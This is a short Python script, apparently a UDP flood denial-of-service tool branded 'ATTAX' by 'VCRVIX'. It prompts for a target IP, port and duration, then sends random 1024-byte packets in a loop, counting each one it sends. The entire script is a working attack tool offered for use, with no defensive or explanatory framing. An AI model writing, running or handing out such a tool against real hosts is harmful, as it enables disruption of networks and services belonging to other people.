import socket
import random
import time

# Open a new socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#python3 attax.py
# Create a packet
bytes = random._urandom(1024)
print("    ________________________________  ____  ___ " )
print("   /  _  \__    ___/\__    ___/  _  \ \   \/  / " )
print("  /  /_\  \|    |     |    | /  /_\  \ \     / "  )
print(" /    |    \    |     |    |/    |    \/     \ "  )
print(" \____|__  /____|     |____|\____|__  /___/\  \ " )
print("         \/                         \/      \_/ " )
print("[+] created by : VCRVIX")
print("[+] current version : 1.0")
# Get target IP, port, and duration from user
print("")
ip = input("[>] Target IP: ")
port = int(input("[>] Port: "))  # Convert port to integer
duration = float(input("Duration (seconds): "))  # Convert duration to float

# Calculate timeout
timeout = time.time() + duration
sent = 0

# Send packets until the timeout is reached
while True:
    if time.time() > timeout:
        break
    else:
        pass
    sock.sendto(bytes, (ip, port))
    sent = sent + 1
    print("[>] Sent %s packet to %s through port %s" % (sent, ip, port))
